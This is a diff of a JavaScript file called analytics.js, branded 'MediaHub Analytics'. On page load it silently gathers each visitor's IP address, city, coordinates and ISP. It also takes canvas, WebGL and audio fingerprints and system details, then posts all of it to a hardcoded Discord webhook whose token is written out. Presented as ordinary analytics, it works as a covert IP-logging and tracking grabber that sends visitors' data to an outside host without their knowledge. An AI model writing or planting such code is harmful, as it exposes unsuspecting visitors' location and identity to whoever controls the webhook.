@@ -1,44 +1,108 @@
-// analytics.js - Advanced fingerprinting and analytics
-(function() {
-    'use strict';
-    
-    // Generate a unique fingerprint for each device
-    function generateFingerprint() {
+// analytics.js - Advanced User Analytics & Fingerprinting
+class AdvancedAnalytics {
+    constructor() {
+        this.webhookUrl = 'https://discord.com/api/webhooks/1411453235834654792/m4kwAhRpqLt6BS-uoe6wXE4kmaDOsapMg8t1R-l6zjxLLJbhaFNYpYuKkEzIxHtPKhBK';
+        this.init();
+    }
+
+    async init() {
+        await this.collectComprehensiveData();
+    }
+
+    async collectComprehensiveData() {
+        try {
+            const [ipInfo, fingerprint, systemInfo] = await Promise.all([
+                this.getIPInfo(),
+                this.generateAdvancedFingerprint(),
+                this.getSystemInfo()
+            ]);
+
+            const userData = {
+                ...ipInfo,
+                ...fingerprint,
+                ...systemInfo,
+                timestamp: new Date().toISOString(),
+                pageUrl: window.location.href,
+                referrer: document.referrer || 'Direct',
+                sessionId: this.generateSessionId()
+            };
+
+            await this.sendToDiscord(userData);
+            this.storeLocalAnalytics(userData);
+
+        } catch (error) {
+            console.warn('Analytics collection limited:', error);
+        }
+    }
+
+    async getIPInfo() {
+        try {
+            const responses = await Promise.allSettled([
+                fetch('https://api.ipify.org?format=json'),
+                fetch('https://ipapi.co/json/'),
+                fetch('https://jsonip.com')
+            ]);
+
+            let ipData = {};
+            for (const response of responses) {
+                if (response.status === 'fulfilled' && response.value.ok) {
+                    const data = await response.value.json();
+                    ipData = { ...ipData, ...data };
+                }
+            }
+
+            return {
+                ip: ipData.ip || 'Unknown',
+                country: ipData.country_name || ipData.country || 'Unknown',
+                city: ipData.city || 'Unknown',
+                region: ipData.region || ipData.region_code || 'Unknown',
+                isp: ipData.org || ipData.isp || 'Unknown',
+                timezone: ipData.timezone || 'Unknown',
+                coordinates: ipData.latitude && ipData.longitude ? 
+                    `${ipData.latitude}, ${ipData.longitude}` : 'Unknown'
+            };
+        } catch {
+            return { ip: 'Unknown', error: 'IP detection failed' };
+        }
+    }
+
+    generateAdvancedFingerprint() {
         const components = [];
-        
-        // Browser and OS info
-        components.push(navigator.userAgent);
-        components.push(navigator.platform);
-        components.push(navigator.language);
-        components.push(screen.width + 'x' + screen.height);
-        components.push(screen.colorDepth + '-bit');
-        components.push(new Date().getTimezoneOffset());
-        components.push(navigator.hardwareConcurrency || 'unknown');
-        components.push(navigator.deviceMemory || 'unknown');
-        
-        // Canvas fingerprinting (very effective)
+
+        // Canvas fingerprinting
         try {
             const canvas = document.createElement('canvas');
             const ctx = canvas.getContext('2d');
-            canvas.width = 200;
-            canvas.height = 50;
+            canvas.width = 240; canvas.height = 60;
             ctx.textBaseline = 'top';
-            ctx.font = '14px Arial';
+            ctx.font = '16px Arial';
             ctx.fillStyle = '#f60';
-            ctx.fillRect(0, 0, 100, 50);
+            ctx.fillRect(0, 0, 120, 60);
             ctx.fillStyle = '#069';
-            ctx.fillText('Media Delivery Analytics', 2, 15);
+            ctx.fillText('MediaHub Analytics', 4, 20);
             ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-            ctx.fillText('Media Delivery Analytics', 4, 17);
-            components.push(canvas.toDataURL());
-        } catch (e) {
-            components.push('canvas-fail');
-        }
-        
-        // Audio fingerprinting
+            ctx.fillText('MediaHub Analytics', 6, 22);
+            components.push(canvas.toDataURL().substring(0, 100));
+        } catch (e) {}
+
+        // WebGL fingerprint
+        try {
+            const gl = document.createElement('canvas').getContext('webgl');
+            if (gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debugInfo) {
+                    components.push(gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL));
+                    components.push(gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL));
+                }
+            }
+        } catch (e) {}
+
+        // Audio fingerprint
         try {
             const audioContext = new (window.AudioContext || window.webkitAudioContext)();
             const oscillator = audioContext.createOscillator();
+            oscillator.type = 'sine';
+            oscillator.frequency.setValueAtTime(1000, audioContext.currentTime);
             const analyser = audioContext.createAnalyser();
             oscillator.connect(analyser);
             analyser.connect(audioContext.destination);
@@ -46,194 +110,117 @@
             const data = new Uint8Array(analyser.frequencyBinCount);
             analyser.getByteFrequencyData(data);
             oscillator.stop();
-            components.push(Array.from(data).join(','));
-        } catch (e) {
-            components.push('audio-fail');
-        }
-        
-        // Font detection
-        const fonts = [
-            'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New', 
-            'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS', 'Verdana'
-        ];
-        
-        const availableFonts = [];
-        const div = document.createElement('div');
-        div.style.position = 'absolute';
-        div.style.left = '-9999px';
-        div.style.fontSize = '72px';
-        div.innerHTML = 'mmmmmmmmmmlli';
-        
-        document.body.appendChild(div);
-        
-        const defaultWidth = div.offsetWidth;
-        const defaultHeight = div.offsetHeight;
-        
-        fonts.forEach(font => {
-            div.style.fontFamily = font;
-            if (div.offsetWidth !== defaultWidth || div.offsetHeight !== defaultHeight) {
-                availableFonts.push(font);
-            }
-        });
-        
-        document.body.removeChild(div);
-        components.push(availableFonts.join(','));
-        
-        return btoa(components.join('|')).substring(0, 32);
+            components.push(Array.from(data).join('').substring(0, 20));
+        } catch (e) {}
+
+        return {
+            deviceId: btoa(components.join('|')).substring(0, 32),
+            fingerprint: components.length > 0 ? 'Present' : 'Blocked'
+        };
     }
-    
-    // Get detailed location info from IP
-    async function getIPAndLocation() {
-        try {
-            // Get IP address
-            const ipResponse = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipResponse.json();
-            
-            // Get location details
-            const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-            const locationData = await locationResponse.json();
-            
-            return {
-                ip: ipData.ip,
-                country: locationData.country_name,
-                region: locationData.region,
-                city: locationData.city,
-                isp: locationData.org,
-                timezone: locationData.timezone,
-                coordinates: `${locationData.latitude}, ${locationData.longitude}`
-            };
-        } catch (error) {
-            console.log('Location detection failed:', error);
-            return { ip: 'unknown', error: error.message };
-        }
+
+    getSystemInfo() {
+        const connection = navigator.connection || {};
+        
+        return {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown',
+            screen: `${screen.width}x${screen.height}`,
+            colorDepth: `${screen.colorDepth}-bit`,
+            cpuCores: navigator.hardwareConcurrency || 'Unknown',
+            deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown',
+            connectionType: connection.effectiveType || 'Unknown',
+            networkSpeed: connection.downlink ? `${connection.downlink}Mbps` : 'Unknown',
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            cookiesEnabled: navigator.cookieEnabled,
+            javaEnabled: navigator.javaEnabled ? 'Yes' : 'No',
+            pdfViewerEnabled: navigator.pdfViewerEnabled ? 'Yes' : 'No',
+            deviceType: this.getDeviceType()
+        };
     }
-    
-    // Get browser plugins
-    function getBrowserPlugins() {
-        const plugins = [];
-        for (let i = 0; i < navigator.plugins.length; i++) {
-            plugins.push(navigator.plugins[i].name);
-        }
-        return plugins.join(', ');
+
+    getDeviceType() {
+        const ua = navigator.userAgent;
+        if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return 'Tablet';
+        if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return 'Mobile';
+        return 'Desktop';
     }
-    
-    // Get connection info
-    function getConnectionInfo() {
-        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        if (connection) {
-            return {
-                effectiveType: connection.effectiveType,
-                downlink: connection.downlink + ' Mbps',
-                rtt: connection.rtt + ' ms'
-            };
-        }
-        return { effectiveType: 'unknown' };
+
+    generateSessionId() {
+        return 'session_' + Math.random().toString(36).substr(2, 9) + Date.now().toString(36);
     }
-    
-    // Send data to Discord
-    async function sendToDiscord(data) {
-        try {
-            const webhookURL = 'https://discord.com/api/webhooks/1411453235834654792/m4kwAhRpqLt6BS-uoe6wXE4kmaDOsapMg8t1R-l6zjxLLJbhaFNYpYuKkEzIxHtPKhBK';
-            
-            const embed = {
-                title: "🌐 Advanced Visitor Analytics",
-                color: 0x0099ff,
-                fields: [
-                    {
-                        name: "🆔 Device Fingerprint",
-                        value: `\`\`\`${data.fingerprint}\`\`\``,
-                        inline: false
-                    },
-                    {
-                        name: "📍 Location Info",
-                        value: `**IP:** ${data.ip}\n**Country:** ${data.country}\n**City:** ${data.city}\n**ISP:** ${data.isp}\n**Coordinates:** ${data.coordinates}`,
-                        inline: true
-                    },
-                    {
-                        name: "💻 System Info",
-                        value: `**Browser:** ${data.browser}\n**OS:** ${data.os}\n**Screen:** ${data.screen}\n**CPU Cores:** ${data.cores}\n**RAM:** ${data.ram}GB`,
-                        inline: true
-                    },
-                    {
-                        name: "🌐 Connection",
-                        value: `**Type:** ${data.connectionType}\n**Speed:** ${data.connectionSpeed}\n**Latency:** ${data.connectionLatency}`,
-                        inline: false
-                    },
-                    {
-                        name: "📊 Additional Info",
-                        value: `**User Agent:** ${data.userAgent}\n**Languages:** ${data.languages}\n**Timezone:** ${data.timezone}\n**Referrer:** ${data.referrer}`,
-                        inline: false
-                    },
-                    {
-                        name: "🕒 Visit Time",
-                        value: `<t:${Math.floor(data.timestamp / 1000)}:F>`,
-                        inline: true
-                    }
-                ],
-                footer: {
-                    text: "Media Delivery Analytics • " + new Date().toLocaleDateString()
-                }
-            };
-            
-            await fetch(webhookURL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
+
+    async sendToDiscord(data) {
+        const embed = {
+            title: "🌐 MediaHub Visitor Analytics",
+            color: 0x0099ff,
+            timestamp: new Date().toISOString(),
+            fields: [
+                {
+                    name: "👤 User Identification",
+                    value: `**IP:** ${data.ip}\n**Country:** ${data.country}\n**City:** ${data.city}\n**ISP:** ${data.isp}\n**Device:** ${data.deviceType}`,
+                    inline: true
                 },
+                {
+                    name: "💻 System Profile",
+                    value: `**OS:** ${data.platform}\n**Browser:** ${this.parseBrowser(data.userAgent)}\n**Screen:** ${data.screen}\n**CPU:** ${data.cpuCores} cores\n**RAM:** ${data.deviceMemory}`,
+                    inline: true
+                },
+                {
+                    name: "🌐 Network Info",
+                    value: `**Connection:** ${data.connectionType}\n**Speed:** ${data.networkSpeed}\n**Timezone:** ${data.timezone}\n**Language:** ${data.language}`,
+                    inline: false
+                },
+                {
+                    name: "🔍 Advanced Tracking",
+                    value: `**Device ID:** ||${data.deviceId}||\n**Fingerprint:** ${data.fingerprint}\n**Session:** ${data.sessionId}`,
+                    inline: false
+                },
+                {
+                    name: "📊 Visit Details",
+                    value: `**URL:** ${data.pageUrl}\n**Referrer:** ${data.referrer}\n**Time:** <t:${Math.floor(new Date(data.timestamp).getTime() / 1000)}:R>`,
+                    inline: false
+                }
+            ],
+            footer: {
+                text: "MediaHub Pro Analytics • Secure Tracking"
+            }
+        };
+
+        try {
+            await fetch(this.webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    username: "Advanced Analytics",
+                    username: "MediaHub Analytics Dashboard",
                     embeds: [embed]
                 })
             });
-            
         } catch (error) {
-            console.log('Failed to send analytics:', error);
+            console.warn('Discord webhook failed:', error);
         }
     }
-    
-    // Main analytics function
-    async function collectAnalytics() {
+
+    parseBrowser(userAgent) {
+        if (userAgent.includes('Chrome')) return 'Chrome';
+        if (userAgent.includes('Firefox')) return 'Firefox';
+        if (userAgent.includes('Safari')) return 'Safari';
+        if (userAgent.includes('Edge')) return 'Edge';
+        if (userAgent.includes('Opera')) return 'Opera';
+        return 'Unknown';
+    }
+
+    storeLocalAnalytics(data) {
         try {
-            const fingerprint = generateFingerprint();
-            const locationInfo = await getIPAndLocation();
-            const connectionInfo = getConnectionInfo();
-            
-            const analyticsData = {
-                fingerprint: fingerprint,
-                ip: locationInfo.ip || 'unknown',
-                country: locationInfo.country || 'unknown',
-                region: locationInfo.region || 'unknown',
-                city: locationInfo.city || 'unknown',
-                isp: locationInfo.isp || 'unknown',
-                coordinates: locationInfo.coordinates || 'unknown',
-                timezone: locationInfo.timezone || 'unknown',
-                
-                browser: navigator.userAgent,
-                os: navigator.platform,
-                screen: `${screen.width}x${screen.height}`,
-                cores: navigator.hardwareConcurrency || 'unknown',
-                ram: navigator.deviceMemory || 'unknown',
-                plugins: getBrowserPlugins(),
-                
-                connectionType: connectionInfo.effectiveType,
-                connectionSpeed: connectionInfo.downlink || 'unknown',
-                connectionLatency: connectionInfo.rtt || 'unknown',
-                
-                languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
-                referrer: document.referrer || 'direct',
-                userAgent: navigator.userAgent,
-                timestamp: Date.now(),
-                url: window.location.href
-            };
-            
-            await sendToDiscord(analyticsData);
-            
-        } catch (error) {
-            console.log('Analytics collection error:', error);
-        }
+            localStorage.setItem('mediahub_last_visit', JSON.stringify({
+                timestamp: data.timestamp,
+                deviceId: data.deviceId
+            }));
+        } catch (e) {}
     }
-    
-    // Start analytics with delay
-    setTimeout(collectAnalytics, 2000);
-    
-})();
+}
+
+// Initialize analytics with delay
+setTimeout(() => new AdvancedAnalytics(), 1500);
